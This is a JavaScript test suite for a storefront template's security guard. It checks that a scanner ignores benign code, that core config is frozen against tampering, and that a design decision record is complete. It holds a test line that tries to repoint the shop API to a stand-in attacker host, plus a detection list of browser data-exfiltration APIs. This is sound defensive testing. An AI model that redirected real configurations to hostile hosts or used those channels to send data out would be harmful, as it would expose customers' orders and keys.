test('storefront scan (D20): copy text, comments, data keys and look-alike identifiers are NOT violations; the template design layer has zero', () => {
  const d = scanMerchant();
  const good = [
    "var a = 'we fetch your order and refetch the page';",
    "var b = `Beacon of light ${1 + 1} WebSocket-free`;",
    "// fetch('/x'); new Image(); sendBeacon\nvar c = 1;",
    "/* new WebSocket('x'); EventSource */ var d = 2;",
    "var e = { fetch: 1, sendBeacon: 2 };",
    "var prefetched = 1, refetch = 2, fetchAll = 3, myWebSocket = 4, ImageList = [], newImage = 5;",
    "var f = 'Image' + ' gallery';",
    "var g = { alt: 'new Image of the shop' };",
    "var o = { fetch: 1 }; o.fetch = 2; var x = o.fetch;",
    "var api = {}; api?.fetch; api.fetch.name; api.sendBeacon; api.WebSocket; api?.EventSource;",
    "var o = { \"fetch\": 1, 'sendBeacon': 2 };",
    "switch (k) { case \"fetch\": break; case 'WebSocket': break; }",
    "var o = { fetch: x, sendBeacon: y };",
    "var api = {}; const { fetch: f } = api; const { sendBeacon: b, WebSocket: W } = api;",
    "var api = {}; const { \"fetch\": f2 } = api;",
    "var r = /fetch/g, r2 = /new Image()/, r3 = /sendBeacon|WebSocket/i; var n = 'abc'.replace(/fetch/, 'x');",
    "if (/EventSource/.test(s)) { s = s.replace(/new Image\\(\\)/, ''); }",
    "var a = 1 / 2; var b = a / 3;",
    "var win = 1; var topic = 2; var selfie = 3; var parentNode = 4; var windows = [], opener = 5, reopen = 6, isOpen = true; isOpen = !isOpen;",
    "function open() {} var drawer = { open: false, toggleOpen: 1 }; drawer.open = true; if (drawer.open) { drawer.open = false; }",
    "var el = {}; el.open = 1; el.opened = 2;",
    "location.hash = '#/shop'; var h = location.hash; if (location.hash === '#/x') { h = 1; }",
    "location.replace(ok ? '#/order-status' : '#/'); location.href = '#/home';",
    "var u = location.href.replace(/x/, 'y'); var p = location.pathname; var s = location.search;",
    "var s = document.createElement('div'); var i = document.createElement('img'); var b = document.createElement('button');",
    "var t = '<a href=\"#/x\" class=\"ping-pong\">x</a>'; var ping = 1; var pings = [ping];",
    "var sw = 'serviceWorker is not used'; var x = { serviceWorker: 1 };",
    "function f(parent) { const p = parent; return p; }",
    "const y = 1; function g(top) { const t = top; return t; } var z = (self) => { const s2 = self; return s2; };",
    "var o = { self: 1 }; function h(self, top, parent) { var a = self, b = top, c = parent; return [a, b, c]; }",
    "try { x(); } catch (parent) { const q = parent; }",
    "const { top, parent } = layout; const t2 = top; const p2 = parent;",
    "const parent = document.body; const p3 = parent;",
    "var drawer = { open() { return 1; }, close() { return 0; } }; drawer.open();",
    "class Menu { open() { this.shown = true; } static open() { return 1; } }",
    "function open(x) { return x; } open(1);",
    "var el = {}; el.dataset.ping = '1'; el.style.ping = 'x'; var props = {}; props.ping = 2; state.ping = 3; options.ping = 4;",
    "var w = window.innerWidth; var h = window.innerHeight; var s = window.scrollY; var z = self === window;"
  ];
  for (const code of good) { const r = withApp(d, code); assert.equal(r.status, 0, code + '\n' + r.out); }
  const t = layers(TEMPLATE);
  assert.equal(t.status, 0, t.out);
  assert.doesNotMatch(t.out, /network scan/);
  // core files (public/commerce/**) use fetch themselves and stay exempt
  assert.match(read(d, 'public/commerce/api.js'), /fetch\(/);
  assert.equal(layers(d).status, 0);
  // docs and skill examples of the storefront design layer produce nothing: scan every code block in them as if it were design code
  const docs = [f('.claude/skills/storefront-design/SKILL.md')];
  for (const dd of docs) for (const m of dd.matchAll(/```(?:js|javascript)\n([\s\S]*?)```/g)) { const r = withApp(d, m[1]); assert.equal(r.status, 0, m[1] + r.out); }
});

// ───────────── runtime: what the design layer can reach ─────────────
function loadCore(config) {
  const sb = {
    console, setTimeout, clearTimeout, URL, JSON, Promise, Date, Math, Object, Array, String, Number, RegExp, encodeURIComponent,
    fetch: () => Promise.reject(new Error('no network')),
    localStorage: { getItem: () => null, setItem() {}, removeItem() {} }, sessionStorage: { getItem: () => null, setItem() {}, removeItem() {} },
    document: { createElement: () => ({ appendChild() {} }), body: { appendChild() {} }, visibilityState: 'visible', addEventListener() {} },
    crypto: {}, location: { href: 'http://localhost/', search: '', hash: '' }, history: { state: null, replaceState() {} },
    DOMParser: class { parseFromString() { return { body: { childNodes: [] } }; } }, addEventListener() {}
  };
  sb.window = sb; sb.SHOP_CONFIG = config;
  vm.createContext(sb);
  for (const n of ['api.js', 'cart.js', 'content-allowlist.js', 'content.js', 'checkout.js']) vm.runInContext(f('public/commerce/' + n), sb, { filename: n });
  return sb;
}
test('runtime: after the core scripts load, ShopCommerce has no _internal handle and SHOP_CONFIG is frozen (the design layer cannot call apiFetch or repoint the API)', () => {
  const cfg = { apiBase: ORIGINS.apiOrigin, publishableKey: 'pk_testkey123456', showPrices: true, featuredCategory: 'x' };
  const sb = loadCore(cfg);
  const C = sb.ShopCommerce;
  assert.equal(C._internal, undefined);
  assert.ok(!Object.getOwnPropertyNames(C).includes('_internal'));
  assert.ok(Object.isFrozen(C) && Object.isFrozen(C.cart) && Object.isFrozen(C.checkout));
  assert.ok(Object.isFrozen(sb.SHOP_CONFIG));
  assert.throws(() => { 'use strict'; sb.SHOP_CONFIG.apiBase = 'https://evil.example.test'; }, TypeError);
  assert.equal(typeof C.loadCatalog, 'function');   // the public surface still works (the closures kept what they need)
  assert.equal(JSON.stringify(Object.keys(C).filter((k) => k.startsWith('_'))), '[]');
});

// ───────────── the decision is recorded ─────────────
test('D20 is recorded (newest first) with the approvals, the mechanism, the scan additions, the analysis and the residual risks', () => {
  const lines = f('docs/DECISIONS.md').split('\n');
  const ids = lines.map((l) => /^### (D\d+)\./.exec(l)).filter(Boolean).map((m) => m[1]);
  assert.equal(ids[2], 'D21'); assert.equal(ids[3], 'D20'); assert.equal(ids[4], 'D19');
  const start = lines.findIndex((l) => l.startsWith('### D20.'));
  let end = lines.findIndex((l, i) => i > start && /^##/.test(l)); if (end < 0) end = lines.length;
  const body = lines.slice(start + 1, end).join('\n');
  for (const n of ['D16', 'D10', 'merchant.headers.json', 'scripts/headers.core.txt', 'scripts/render-headers.mjs', 'byte-identical', 'sync-core', 'check-scope', 'check-locked', 'connect-src', 'img-src',
    'sendBeacon', 'WebSocket', 'EventSource', 'XMLHttpRequest', 'new Image', 'canonical', '_internal', 'frozen', 'order access token', 'localStorage', 'Residual', 'follow-up', 'extraConnect', 'migration',
    'form-action', 'ECPay', 'RTCPeerConnection', 'navigation']) assert.ok(body.includes(n), n);
  assert.match(body.trim(), /\.$/);
  const cl = f('docs/CORE-CHANGELOG.md');
  assert.match(cl, /decision D20/); assert.match(cl, /merchant\.headers\.json/);
  assert.equal(JSON.parse(f('template.json')).version, V1, 'template.json carries the release version');
  for (const doc of ['README.md', 'docs/TEMPLATE-NOTES.md', '.claude/skills/storefront-design/SKILL.md', '.claude/skills/merchant-onboarding/SKILL.md', 'CLAUDE.md']) assert.match(f(doc), /merchant\.headers\.json/, doc);
});
